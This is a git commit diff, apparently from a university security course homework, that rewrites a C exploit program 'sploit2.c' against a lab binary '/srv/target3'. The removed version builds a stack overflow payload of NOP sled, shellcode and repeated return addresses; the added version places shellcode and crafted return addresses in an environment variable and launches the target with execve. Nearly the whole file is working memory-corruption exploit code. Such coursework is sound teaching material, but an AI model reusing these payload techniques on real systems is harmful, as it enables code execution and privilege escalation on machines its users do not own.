78370f9cf6b56836b8fc495e7caf4cbccab2e82c
justinhalford <justinhalford@gmail.com>
2024-05-10 19:20:31 -0400

    may 7

--- cs5435-hw4/sploits/sploit2.c
+++ cs5435-hw4/sploits/sploit2.c
@@ -5,39 +5,35 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target2"
+#define TARGET "/srv/target3"
 
-const int BUFFER_SIZE = 409;
-const int SHELLCODE_OFFSET = 201;
-const uint32_t RETURN_ADDRESS = 0xffffdb5c;
+const int ENV_SIZE = 400;
+const int NOP_SIZE = 201;
+const uint32_t BASE_ADDR = 0xffffdec0;
+const int RET_OFFSET = 4;
 
-void preparePayload(char *buffer) {
-    memset(buffer, 0x90, BUFFER_SIZE - 1);
-    memcpy(buffer + SHELLCODE_OFFSET, shellcode, sizeof(shellcode) - 1);
-
-    for (int i = SHELLCODE_OFFSET + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
-        *(uint32_t *)(buffer + i) = RETURN_ADDRESS;
-    }
-
-    buffer[BUFFER_SIZE - 1] = '\0';
+void prepareEnvironment(char *env) {
+    memset(env, 0x90, ENV_SIZE - 1);
+    *((uint32_t *)(env)) = BASE_ADDR + RET_OFFSET;
+    *((uint32_t *)(env + RET_OFFSET)) = BASE_ADDR + 2 * RET_OFFSET;
+    memcpy(env + NOP_SIZE, shellcode, sizeof(shellcode));
+    env[ENV_SIZE - 1] = '\0';
 }
 
-int main(void)
-{
-    char *args[4];
-    char *env[1];
-    char payload[BUFFER_SIZE];
+int main(void) {
+    char *args[3];
+    char *envp[1];
+    char env[ENV_SIZE];
 
-    preparePayload(payload);
+    prepareEnvironment(env);
 
     args[0] = TARGET;
-    args[1] = payload;
-    args[2] = "65935";
-    args[3] = NULL;
+    args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
+    args[2] = NULL;
 
-    env[0] = NULL;
+    envp[0] = env;
 
-    execve(TARGET, args, env);
+    execve(TARGET, args, envp);
     fprintf(stderr, "execve failed.\n");
 
     return 0;
